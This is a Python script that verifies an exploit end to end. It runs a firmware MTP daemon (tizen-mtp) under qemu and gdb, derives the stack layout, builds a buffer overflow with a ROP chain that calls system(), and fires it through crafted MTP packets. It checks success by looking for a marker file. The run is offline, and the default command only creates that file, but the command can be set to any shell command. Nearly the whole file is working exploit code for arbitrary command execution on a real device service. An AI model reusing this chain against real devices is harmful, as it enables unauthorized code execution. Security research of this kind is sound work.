#!/usr/bin/env python3
"""chainverify: prove the harvested offsets by firing the ROP chain offline.

End-to-end verification for a firmware image, using only derived values:

  1. start the genuine tizen-mtp under qemu (same env as stackdelta),
  2. capture the command thread's copy-helper frame (S, dst, caller LR),
  3. derive the caller's saved-register slots from its prologue,
  4. build the Bug-3 overflow + ROP chain from elfscan constants
     (pop gadget, ldr/blx gadget, in-binary system, PIE base) and the
     derived frame layout,
  5. fire it and require the observable side effect: the command runs.

Usage:
  tools/chainverify/verify.py --mtp <tizen-mtp> --rootfs <dir> --workdir <dir> \
      --elfscan <elfscan.json> --out <json> \
      [--command 'touch /mnt/base-us/CHAINVERIFY'] [--marker CHAINVERIFY]
"""
import argparse
import json
import os
import shlex
import re
import struct
import subprocess
import sys
import time

REPO = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
sys.path.insert(0, os.path.join(REPO, "tools", "stackdelta"))
import measure as sd  # noqa: E402

from capstone import Cs, CS_ARCH_ARM, CS_MODE_THUMB, CS_MODE_LITTLE_ENDIAN  # noqa: E402

md = Cs(CS_ARCH_ARM, CS_MODE_THUMB | CS_MODE_LITTLE_ENDIAN)
DEFAULT_COMMAND = "touch /mnt/base-us/CHAINVERIFY"
DEFAULT_MARKER = "CHAINVERIFY"
POP_REG_NAMES = ["r0", "r1", "r2", "r3", "r4", "r5", "r6", "r7"]


def log(msg):
    print(msg, flush=True)


def fail(msg, code=1):
    log("chainverify: " + msg)
    sys.exit(code)


def free_port():
    import socket
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    port = s.getsockname()[1]
    s.close()
    return port


def wait_for_frames(gdb_log, min_lines, timeout):
    end = time.time() + timeout
    frames = []
    while time.time() < end:
        try:
            with open(gdb_log, errors="replace") as f:
                frames = [l for l in f if "FRAME " in l]
        except FileNotFoundError:
            frames = []
        if len(frames) >= min_lines:
            break
        time.sleep(0.1)
    return frames


def parse_frames(lines):
    frames = []
    for line in lines:
        m = re.search(r"FRAME sp=(0x[0-9a-f]+) r7=(0x[0-9a-f]+) lr=(0x[0-9a-f]+) "
                      r"src=(0x[0-9a-f]+) dst=(0x[0-9a-f]+) len=(\d+)", line)
        if m:
            frames.append({
                "sp": int(m.group(1), 16), "r7": int(m.group(2), 16),
                "lr": int(m.group(3), 16), "src": m.group(4),
                "dst": int(m.group(5), 16), "len": int(m.group(6)),
            })
    return frames


def peek(pid, addr, n):
    fd = os.open("/proc/%d/mem" % pid, os.O_RDONLY)
    try:
        return os.pread(fd, n, addr)
    finally:
        os.close(fd)


def start_gdb(guestroot, mtp, port, gdb_log, rx_copy_site):
    out = open(gdb_log, "wb")
    p = subprocess.Popen(["gdb-multiarch", "-nx", "-q"], stdin=subprocess.PIPE,
                         stdout=out, stderr=subprocess.STDOUT)

    def cmd(line):
        if p.stdin:
            p.stdin.write((line + "\n").encode())
            p.stdin.flush()

    cmd("set pagination off")
    cmd("set confirm off")
    cmd("set sysroot %s" % guestroot)
    cmd("file %s" % mtp)
    cmd("target remote :%d" % port)
    cmd("handle SIGSEGV stop nopass")
    cmd("handle SIGABRT stop nopass")
    cmd("handle SIGILL stop nopass")
    cmd("break *%#x" % rx_copy_site)
    cmd("commands")
    cmd("silent")
    cmd('printf "FRAME sp=%#x r7=%#x lr=%#x src=%#x dst=%#x len=%u\\n", '
        '$sp, $r7, $lr, $r0, $r1, *(unsigned int*)$r0')
    cmd("continue")
    cmd("end")
    cmd("continue")
    return p, out, cmd


def make_file(tr, name):
    tr.send(sd.cmd(0x100C, 1, [0, 0xFFFFFFFF, 0]))
    time.sleep(0.05)
    tr.send(sd.data(0x100C, 1, sd.object_info(0, 0x3801, 0xFFFFFFFF, name, 0, 0)))
    for p in tr.recv(1.0):
        typ, code, tid, pay = sd.parse_container(p)
        if typ == sd.RESP and code == 0x2001:
            return struct.unpack_from("<I", pay, 8)[0]
    return None


def pick_transport_frame(frames):
    groups = {}
    for f in frames:
        groups.setdefault(f["sp"], []).append(f)
    varied = [sp for sp, fs in groups.items()
              if len({f["src"] for f in fs}) >= 2]
    if len(varied) != 1:
        fail("expected exactly one transport-thread frame group, got %s"
             % ([hex(s) for s in varied] or "none"), 3)
    sp = varied[0]
    fs = groups[sp]
    lrs = {f["lr"] for f in fs}
    if len(lrs) != 1:
        fail("transport frames have %d distinct caller LRs" % len(lrs), 3)
    return {"sp": sp, "dst": fs[0]["dst"], "lr": lrs.pop(), "frames": len(fs)}


def prologue_scan(raw, sec, lr, limit=0x4000):
    """Find the caller function entry: nearest preceding push{,lr} with a
    recognizable prologue (push + sub sp) at an instruction boundary."""
    taddr, tsize = sec["addr"], sec["size"]
    data = raw[sec["off"]:sec["off"] + tsize]
    rel = lr & ~1
    if not (taddr <= rel < taddr + tsize):
        return None
    off = rel - taddr
    for start in range(off & ~1, max(-1, off - limit), -2):
        hw = struct.unpack_from("<H", data, start)[0]
        if hw & 0xFE00 != 0xB400 or hw & 0x100 == 0:
            continue
        regs = [POP_REG_NAMES[b] for b in range(8) if hw & (1 << b)]
        regs.append("lr")
        insns = []
        for ins in md.disasm(data[start:start + 24], taddr + start):
            insns.append((ins.address, ins.mnemonic, ins.op_str))
            if len(insns) >= 6:
                break
        if len(insns) < 3:
            continue
        m1 = re.match(r"^sub(\.w)?\s+sp, #(0x[0-9a-f]+|\d+)$", insns[1][1] + " " + insns[1][2])
        if not m1:
            continue
        imm = int(m1.group(2), 0)
        return {"entry": taddr + start, "regs": regs, "imm": imm,
                "insns": ["%s %s" % (m, o) for _, m, o in insns]}
    return None


def saved_slots(prologue, sp_at_call):
    """Addresses of the caller's saved registers: the prologue pushes the
    registers, then `sub sp, #imm` brings sp down to (at most) the call-site
    sp, so the saved block sits imm..imm+4N-4 above S."""
    out = {}
    for i, reg in enumerate(prologue["regs"]):
        out[reg] = sp_at_call + prologue["imm"] + 4 * i
    return out


def build_chain(offsets, base, layout, command):
    """layout: {'src_off': {r4,r7,lr}, 'dst_off': int, 's': int}"""
    pop = base + offsets["pop_gadget"]
    ldr_blx = base + offsets["ldr_blx_gadget"]
    system = base + offsets["system"]
    mask = offsets["pop_gadget_mask"]
    popped = [POP_REG_NAMES[b] for b in range(8) if mask & (1 << b)]
    slots = []
    o = layout["src_off"]["lr"]
    slots.append((o, pop, "saved lr -> pop gadget"))
    for reg in popped:
        o += 4
        val = 0
        if reg == "r3":
            val = system
        slots.append((o, val, reg))
    o += 4  # pc slot (last popped register is pc)
    slots.append((o, ldr_blx, "pc -> ldr/blx gadget"))
    arg_off = o + 4
    str_off = arg_off + 4
    str_addr = layout["s"]["dst"] + str_off
    arg_slot_addr = layout["s"]["dst"] + arg_off
    saved_r7 = arg_slot_addr - 44
    slots.append((arg_off, str_addr, "[r7+44] -> string address"))
    slots.append((layout["src_off"]["r4"], 0, "saved r4"))
    slots.append((layout["src_off"]["r7"], saved_r7, "saved r7 -> [r7+44]=string"))
    str_bytes = command.encode() + b"\x00"
    chain = {"slots": slots, "arg_off": arg_off, "str_off": str_off,
             "str_addr": str_addr, "saved_r7": saved_r7, "popped": popped,
             "pop": pop, "ldr_blx": ldr_blx, "system": system,
             "str_bytes": str_bytes}
    return chain


def build_packets(chain, filler_off_base=0):
    filler = bytearray(1024)
    struct.pack_into("<IHHI", filler, 0, 1024, 1, 0x1001, 0x77)
    for off, val, _ in chain["slots"]:
        struct.pack_into("<I", filler, off, val & 0xFFFFFFFF)
    str_off = chain["str_off"]
    filler[str_off:str_off + len(chain["str_bytes"])] = chain["str_bytes"]
    last_dword = ((str_off + len(chain["str_bytes"]) - 1) // 4) * 4
    n = (last_dword - 12) // 4 + 1

    dummy = struct.pack("<IHHI", 36, 1, 0x1001, 0x71)
    dummy += struct.pack("<IIIII", 0, 0, 0, 0, 0) + struct.pack("<I", 0x40)
    overflow = struct.pack("<IHHI", 36, 1, 0x1001, 0x78)
    overflow += struct.pack("<IIIII", 0, 0, 0, 0, 0) + struct.pack("<I", n)
    return bytes(filler), dummy, overflow, n


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--mtp", required=True)
    ap.add_argument("--rootfs", required=True)
    ap.add_argument("--workdir", required=True)
    ap.add_argument("--out", required=True)
    ap.add_argument("--elfscan", required=True)
    ap.add_argument("--rx-copy-site", type=lambda s: int(s, 0), default=sd.DEFAULT_RX_COPY_SITE)
    ap.add_argument("--inject-event-fn", type=lambda s: int(s, 0), default=sd.DEFAULT_INJECT_EVENT_FN)
    ap.add_argument("--command", default=DEFAULT_COMMAND)
    ap.add_argument("--marker", default=DEFAULT_MARKER)
    ap.add_argument("--timeout", type=float, default=120.0)
    args = ap.parse_args()

    mtp = os.path.abspath(args.mtp)
    rootfs = os.path.abspath(args.rootfs)
    workdir = os.path.abspath(args.workdir)
    os.makedirs(os.path.join(workdir, "logs"), exist_ok=True)
    scan = json.load(open(args.elfscan))
    off = scan["offsets"]
    data, text = sd.elf_text(mtp)
    anchors = {"rx_copy": sd.check_anchor(data, text, "rx_copy", args.rx_copy_site),
               "inject_event": sd.check_anchor(data, text, "inject_event", args.inject_event_fn)}

    if os.environ.get("SD_IN_NS") != "1":
        sd.build_environment(rootfs, workdir)
        store = os.path.join(workdir, "guestroot/mnt/base-us")
        inner = ("mount -t tmpfs none /mnt && mkdir -p /mnt/base-us && "
                 "mount --bind %s /mnt/base-us && SD_IN_NS=1 exec %s %s"
                 % (shlex.quote(store), shlex.quote(sys.executable),
                    " ".join(shlex.quote(a) for a in sys.argv)))
        sys.exit(subprocess.call(["unshare", "-rm", "sh", "-c", inner]))
    guestroot = os.path.join(workdir, "guestroot")
    gdb_log = os.path.join(workdir, "logs/gdb.out")
    port = free_port()
    proc = subprocess.Popen(sd.qemu_command(mtp, guestroot, port, args.inject_event_fn),
                            stdout=open(os.path.join(workdir, "logs/qemu.out"), "wb"),
                            stderr=open(os.path.join(workdir, "logs/qemu.err"), "wb"))
    gdb = gdb_out = None
    try:
        base = sd.wait_for_base(proc.pid)
        if not base:
            fail("tizen-mtp never mapped (see logs/qemu.err)", 3)
        gdb, gdb_out, gdb_cmd = start_gdb(guestroot, mtp, port, gdb_log, base + args.rx_copy_site)
        time.sleep(2.0)

        tr = sd.Transport(guestroot, os.path.join(workdir, "logs/recipe.out"))
        tr.send(sd.cmd(0x1002, 0, [1]))
        session = [sd.parse_container(p)[1] for p in tr.recv(1.0)]
        if 0x2001 not in session:
            fail("OpenSession failed (responses %s)" % [hex(c) for c in session], 3)
        ghost = make_file(tr, "aaaaaaaaTaaaaaaaaaaa")
        if ghost is None:
            fail("could not warm the store with a ghost file", 3)
        tr.send(sd.cmd(0x9803, 1, [ghost, 0xDC08]))
        tr.recv(0.5)

        frames = parse_frames(wait_for_frames(gdb_log, 3, 10.0))
        chain_lines = []
        try:
            with open(gdb_log, errors="replace") as f:
                chain_lines = [l.strip() for l in f if "CHAIN " in l]
        except FileNotFoundError:
            pass
        if len(frames) < 2:
            fail("not enough copy-helper frames captured (%d)" % len(frames), 3)
        pick = pick_transport_frame(frames)
        s = pick["sp"]
        dst_off = pick["dst"] - s
        if dst_off <= 0 or dst_off > 0x100:
            fail("implausible dst offset %#x" % dst_off, 3)
        prolog = prologue_scan(data, text, pick["lr"] - base)
        if not prolog:
            fail("cannot derive caller prologue from lr=%#x (unsupported build)"
                 % pick["lr"], 3)
        slots = saved_slots(prolog, s)
        if "r4" not in slots or "r7" not in slots or "lr" not in slots:
            fail("caller prologue does not save r4/r7/lr: %s" % prolog["regs"], 3)
        src_off = {reg: slots[reg] - s - dst_off for reg in ("r4", "r7", "lr")}
        if min(src_off.values()) < 12:
            fail("derived chain slots overlap the container header: %s" % src_off, 3)
        layout = {"s": {"sp": s, "dst": pick["dst"], "dst_off": dst_off},
                  "src_off": src_off, "caller_lr": hex(pick["lr"]),
                  "prologue": prolog}
        log("layout: S=%#x dst=%#x dst_off=%#x caller=%#x %s imm=%#x slots=%s"
            % (s, pick["dst"], dst_off, prolog["entry"], prolog["regs"],
               prolog["imm"], {k: hex(v) for k, v in src_off.items()}))

        gdb_cmd("break *%#x" % (pick["lr"] & ~1))
        gdb_cmd("commands")
        gdb_cmd("silent")
        gdb_cmd('printf "POSTCOPY sp=%#x r7=%#x r3=%#x\\n", $sp, $r7, $r3')
        gdb_cmd("x/40wx $sp-4")
        gdb_cmd("continue")
        gdb_cmd("end")
        gdb_cmd("break *%#x" % (base + off["pop_gadget"]))
        gdb_cmd("commands")
        gdb_cmd("silent")
        gdb_cmd('printf "CHAIN pop r7=%#x sp=%#x r3=%#x\\n", $r7, $sp, $r3')
        gdb_cmd("continue")
        gdb_cmd("end")
        gdb_cmd("break *%#x" % (base + off["ldr_blx_gadget"]))
        gdb_cmd("commands")
        gdb_cmd("silent")
        gdb_cmd('printf "CHAIN ldr_blx r7=%#x r3=%#x\\n", $r7, $r3')
        gdb_cmd("continue")
        gdb_cmd("end")
        gdb_cmd("break *%#x" % (base + off["system"]))
        gdb_cmd("commands")
        gdb_cmd("silent")
        gdb_cmd('printf "CHAIN system r0=%#x\\n", $r0')
        gdb_cmd("continue")
        gdb_cmd("end")
        gdb_cmd("continue")

        chain = build_chain(off, base, layout, args.command)
        filler, dummy, overflow, n = build_packets(chain)
        log("chain: pop=%#x system=%#x ldr_blx=%#x string@%#x N=%d"
            % (chain["pop"], chain["system"], chain["ldr_blx"], chain["str_addr"], n))

        for _ in range(3):
            tr.send(filler)
            time.sleep(0.3)
            tr.recv(0.2)
        tr.send(dummy)
        time.sleep(0.25)
        tr.recv(0.2)
        tr.send(overflow)
        time.sleep(1.0)
        tr.recv(0.5)
        try:
            with open(gdb_log, errors="replace") as f:
                chain_lines = [l.strip() for l in f if "CHAIN " in l]
        except FileNotFoundError:
            pass
        try:
            with open(gdb_log, errors="replace") as f:
                log_text = f.read()
        except FileNotFoundError:
            log_text = ""
        if "signal SIG" in log_text:
            gdb_cmd("info registers pc sp lr r4 r7 r0 r1 r2 r3")
            gdb_cmd("bt")
            gdb_cmd("x/12i $pc")
            gdb_cmd("x/40wx %#x" % s)
            if frames:
                gdb_cmd("x/40wx %#x" % int(frames[-1]["src"], 16))
            time.sleep(1.0)
        postcopy = []
        try:
            with open(gdb_log, errors="replace") as f:
                all_lines = f.read().splitlines()
            for i, l in enumerate(all_lines):
                if "POSTCOPY" in l:
                    postcopy.append(l.strip())
                    postcopy.extend(x.strip() for x in all_lines[i + 1:i + 9])
        except FileNotFoundError:
            pass
        crash_lines = []
        try:
            with open(gdb_log, errors="replace") as f:
                all2 = f.read().splitlines()
            for i, l in enumerate(all2):
                if "signal SIG" in l:
                    crash_lines = [x.strip() for x in all2[i:i + 80]]
                    break
        except FileNotFoundError:
            pass
        frame_dump = crash_lines or (postcopy[-18:] if postcopy else None)
        rx_dump = None
        try:
            if frames:
                rx_dump = peek(proc.pid, int(frames[-1]["src"], 16), 0xA0).hex()
        except Exception as e:
            log("peek rx failed: %s" % e)
        if gdb:
            gdb.terminate()
            try:
                gdb.wait(timeout=5)
            except subprocess.TimeoutExpired:
                gdb.kill()

        marker = os.path.join(guestroot, "mnt/base-us", args.marker)
        end = time.time() + 8.0
        while time.time() < end:
            if os.path.exists(marker):
                break
            time.sleep(0.2)
        fired = os.path.exists(marker)
        result = {
            "verified": fired,
            "tizen_mtp_sha256": scan["sha256"],
            "base": hex(base),
            "layout": layout,
            "anchors": anchors,
            "chain": {k: (v if k != "str_bytes" else v.hex()) for k, v in chain.items()},
            "command": args.command,
            "marker": args.marker,
            "marker_present": fired,
            "n": n,
            "chain_progress": chain_lines,
            "frame_after_fire": frame_dump,
            "rx_after_fire": rx_dump,
            "crash": crash_lines,
            "host": {"qemu": sd.tool_version(["qemu-arm", "--version"]),
                     "gdb": sd.tool_version(["gdb-multiarch", "--version"])},
        }
        tr.close()
    finally:
        if gdb and gdb.poll() is None:
            gdb.terminate()
            try:
                gdb.wait(timeout=5)
            except subprocess.TimeoutExpired:
                gdb.kill()
        gdb_out.close()
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()

    with open(args.out, "w") as f:
        json.dump(result, f, indent=2)
        f.write("\n")
    log("chainverify: fired=%s marker=%s" % (fired, marker))
    return 0 if fired else 1


if __name__ == "__main__":
    sys.exit(main())
